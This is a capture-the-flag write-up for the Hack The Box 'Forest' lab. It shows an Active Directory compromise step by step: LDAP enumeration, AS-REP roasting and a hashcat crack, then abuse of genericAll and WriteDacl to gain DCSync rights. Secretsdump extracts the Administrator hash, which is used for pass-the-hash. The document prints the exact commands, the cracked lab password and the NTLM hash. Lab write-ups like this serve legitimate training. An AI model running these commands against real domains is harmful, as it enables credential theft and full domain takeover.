## Port Scan

```
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-09-13 20:07:46Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49678/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc        Microsoft Windows RPC
49683/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-13T20:08:36
|_  start_date: 2026-09-13T20:05:07
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-09-13T13:08:38-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m44s, deviation: 4h02m31s, median: 6m43s
```

## SMB anon login

![](pics/Pasted%20image%2020260913230640.png)

## LDAP enum

Dump all AD objects

```bash
ldapsearch -x -H ldap://10.129.95.210 -D "guest" -w "" -b "DC=htb,DC=local"
```

![](pics/Pasted%20image%2020260913230707.png)

Enumerate users

```bash
ldapsearch -x -H ldap://10.129.95.210 -D "guest" -w "" -b "DC=htb,DC=local" "(objectClass=person)" > users.txt

cat users.txt | grep givenName: | awk '{print $2}'
```

![](pics/Pasted%20image%2020260913231406.png)

```
Sebastien # Sebastien Caron, Exchange Administrators, Information 
Lucinda # Lucinda Berger, IT Management, Information Technology,
Andy  # Andy Hislip, Helpdesk, Information Technology, 
Mark  # Mark Brandt, Sysadmins, Information Technology, 
Santi # Santi Rodriguez, Developers, Information Technology, 
```

I could try to brute-force this but I will not.

## Looking for users with no pre-auth

Using `GetNPUsers` to  query target domain for users with Do not require Kerberos `preauthentication`

```bash
impacket-GetNPUsers -dc-ip 10.129.95.210 -request htb.local/
```

![](pics/Pasted%20image%2020260913235454.png)

## Cracking the krb5 ticket

Using hashcat:

```bash
hashcat '$krb5asrep$23$svc-alfresco@HTB.LOCAL:36ea9b055fcb5e69f5e20f39573f9c3b$279714cd6014bda7c8912a3e7eaec9cdbd6e0725fe60861be5a12cf5f8183eb4b004af3cbd1bb051e42721c6855b8902b1e4d9e240a74bfb5902b1b507801c9895b2b5c40494ea3454f3a706cbde582786142c43157ebed9394f07ee27fcf3817fd6e38a1efd9d2fa0bd7a312784f3db03a91ee426262ef801d7935d55b8ca15aaa205421cf5009bda56ed2fa7584e6f94928af9def56af7cb717dc500f00ecf99959808d118b872c09a09f66f903c4718f65a6319e19b40e5c20e3e47a4cb0b595407132099b41a0c8da85864dcbe4ac1ce2e35b6a486e00b5399c696addff99f2f43543229' /usr/share/wordlists/rockyou.txt
```

![](pics/Pasted%20image%2020260913235846.png)

```
svc-alfresco
s3rvice
```

Using evil-winrm to login

```bash
evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
```

![](pics/Pasted%20image%2020260914000408.png)

## Flag 1

![](pics/Pasted%20image%2020260914000437.png)

## PrivEsc to administrator

### Bloodhound

Running rust collector

```bash
rusthound-ce -d htb.local -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice' -z
```

I can see that fresco is a member of group `Account Operators` that have `genericAll` 

![](pics/Pasted%20image%2020260914005849.png)

```
net user test1 Password! /add /domain
net group "KEY ADMINS" /add test1
net group "KEY ADMINS"
```

![](pics/Pasted%20image%2020260914004309.png)

```bash
pywhisker.py -d "htb.local" -u "test1" -p "Password!" --target "administrator" --action "add"
```

![](pics/Pasted%20image%2020260914005922.png)

### Another Try with different collector

After my failed attempt I took a break...Cameback, restarted the machine and used the bloodhound-python collector instead

```bash
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -ns 10.129.58.158 -c All --zip
```

I found this route 

![](pics/Pasted%20image%2020260914190123.png)

### Exploiting misconfigurations

`svc-alfresco` is a part of the `ACCOUNT OPERATORS` which have `genericAll` access on `EXCHANGE WINDOWS PERMISSIONS`, we can create a user then add it to this group and from there we can utilize the `​WriteDacl` permission to dump secrets


#### Exploiting genericAll

First let me create a user

```cmd
net user ret2z Password /add /domain
```

![](pics/Pasted%20image%2020260914191055.png)

Add that user to the target group

```cmd
net group "EXCHANGE WINDOWS PERMISSIONS" /add ret2z
```

![](pics/Pasted%20image%2020260914191151.png)

```cmd
net group "EXCHANGE WINDOWS PERMISSIONS"
```

![](pics/Pasted%20image%2020260914191246.png)

#### Exploiting the WriteDacl

That will grant us DCSync privileges to Domain Controller

First I tried doing that from my linux using `dacledit`

```bash
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'ret2z' -target-dn 'htb.local' 'htb.local'/'ret2z':'Password'
```

![](pics/Pasted%20image%2020260914191846.png)

It failed.

This time I tried exploiting it from the windows machine utilizing the evil-winrm session.

First load powerview
```powershell
. .\PowerView.ps1
```

Setup the creds and login data

```powershell
$SecPassword = ConvertTo-SecureString 'Password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\ret2z', $SecPassword)
```

### Failed attempt

This is deprecated syntax...that freezed on me

```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
```

![](pics/Pasted%20image%2020260914195031.png)

### Successful attempt

After searching for the correct syntax,
I found out that there is some necessary options needed such as `PrincipalIdentity` and `TargetIdentity` should be in the Distinguished Name format

```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb, DC=local" -PrincipalIdentity ret2z -Rights DCSync
```

Now lets dump secrets after we have `DCSync` rights

```bash
impacket-secretsdump htb.local/ret2z:Password@10.129.58.158
```

![](pics/Pasted%20image%2020260914195616.png)

Administrator hash

```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### Pass-the-hash

Using evil-winrm to pth

```bash
evil-winrm -i 10.129.58.158  -u 'Administrator' -H "32693b11e6aa90eb43d32c72a07ceea6"
```

![](pics/Pasted%20image%2020260914195811.png)

## Flag 2

![](pics/Pasted%20image%2020260914195957.png)

![](pics/Pasted%20image%2020260914195908.png)

Done.